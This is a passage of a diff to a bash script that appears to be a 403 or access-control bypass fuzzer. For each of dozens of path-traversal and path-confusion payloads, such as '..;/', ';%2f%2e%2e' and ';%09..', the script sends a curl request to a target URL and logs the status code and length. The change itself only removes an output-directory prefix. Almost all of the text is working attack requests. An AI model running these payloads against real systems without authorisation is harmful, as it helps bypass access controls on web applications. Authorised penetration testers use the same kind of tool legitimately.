+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/../" -H "$user_agent")
 print
 echo -n "Payload [ /..;/..;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/..;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/..;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/..;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/..;/" -H "$user_agent")
 print
 echo -n "Payload [ /..;// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//" -H "$user_agent")
 print
 echo -n "Payload [ /..;//../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//../" -H "$user_agent")
 print
 echo -n "Payload [ /..;//..;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//..;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//..;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//..;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//..;/" -H "$user_agent")
 print
 echo -n "Payload [ /..;/;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/;/" -H "$user_agent")
 print
 echo -n "Payload [ /..;/;/..;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/;/..;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/;/..;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/;/..;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/;/..;/" -H "$user_agent")
 print
 echo -n "Payload [ /.// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.//" -H "$user_agent")
 print
 echo -n "Payload [ /.;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.;/" -H "$user_agent")
 print
 echo -n "Payload [ /.;// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.;//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.;//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.;//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.;//" -H "$user_agent")
 print
 echo -n "Payload [ //.. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//.." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//.." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//.." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//.." -H "$user_agent")
 print
 echo -n "Payload [ //../../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//../../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//../../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//../../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//../../" -H "$user_agent")
 print
 echo -n "Payload [ //..; ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//..;" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//..;" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//..;" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//..;" -H "$user_agent")
 print
 echo -n "Payload [ //./ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//./" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//./" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//./" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//./" -H "$user_agent")
 print
 echo -n "Payload [ //.;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//.;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//.;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//.;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//.;/" -H "$user_agent")
 print
 echo -n "Payload [ ///.. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///.." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///.." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///.." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///.." -H "$user_agent")
 print
 echo -n "Payload [ ///../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///../" -H "$user_agent")
 print
 echo -n "Payload [ ///..// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..//" -H "$user_agent")
 print
 echo -n "Payload [ ///..; ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;" -H "$user_agent")
 print
 echo -n "Payload [ ///..;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;/" -H "$user_agent")
 print
 echo -n "Payload [ ///..;// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;//" -H "$user_agent")
 print
 echo -n "Payload [ //;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//;/" -H "$user_agent")
 print
 echo -n "Payload [ /;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;/" -H "$user_agent")
 print
 echo -n "Payload [ /;// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;//" -H "$user_agent")
 print
 echo -n "Payload [ /;x ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;x" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;x" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;x" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;x" -H "$user_agent")
 print
 echo -n "Payload [ /;x/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;x/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;x/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;x/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;x/" -H "$user_agent")
 print
 echo -n "Payload [ /x/../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/../" -H "$user_agent")
 print
 echo -n "Payload [ /x/..// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..//" -H "$user_agent")
 print
 echo -n "Payload [ /x/../;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/../;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/../;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/../;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/../;/" -H "$user_agent")
 print
 echo -n "Payload [ /x/..;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;/" -H "$user_agent")
 print
 echo -n "Payload [ /x/..;// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;//" -H "$user_agent")
 print
 echo -n "Payload [ /x/..;/;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;/;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;/;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;/;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;/;/" -H "$user_agent")
 print
 echo -n "Payload [ /x//../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x//../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x//../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x//../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x//../" -H "$user_agent")
 print
 echo -n "Payload [ /x//..;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x//..;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x//..;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x//..;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x//..;/" -H "$user_agent")
 print
 echo -n "Payload [ /x/;/../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/;/../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/;/../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/;/../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/;/../" -H "$user_agent")
 print
 echo -n "Payload [ /x/;/..;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/;/..;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/;/..;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/;/..;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/;/..;/" -H "$user_agent")
 print
 echo -n "Payload [ ; ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;" -H "$user_agent")
 print
 echo -n "Payload [ ;%09 ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09" -H "$user_agent")
 print
 echo -n "Payload [ ;%09.. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09.." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09.." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09.." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09.." -H "$user_agent")
 print
 echo -n "Payload [ ;%09..; ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09..;" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09..;" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09..;" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09..;" -H "$user_agent")
 print
 echo -n "Payload [ ;%09; ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09;" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09;" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09;" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09;" -H "$user_agent")
 print
 echo -n "Payload [ ;%2F.. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2F.." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2F.." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2F.." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2F.." -H "$user_agent")
 print
 echo -n "Payload [ ;%2f%2e%2e ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2e%2e" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2e%2e" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2e%2e" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2e%2e" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f%2e%2e%2f%2e%2e%2f%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f%2f/../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2f/../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2f/../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2f/../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2f/../" -H "$user_agent")
 print
 echo -n "Payload [ ;%2f.. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f.." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f.." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f.." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f.." -H "$user_agent")
 print
 echo -n "Payload [ ;%2f..%2f%2e%2e%2f%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f%2e%2e%2f%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f%2e%2e%2f%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f%2e%2e%2f%2f" -H "$user_agent"
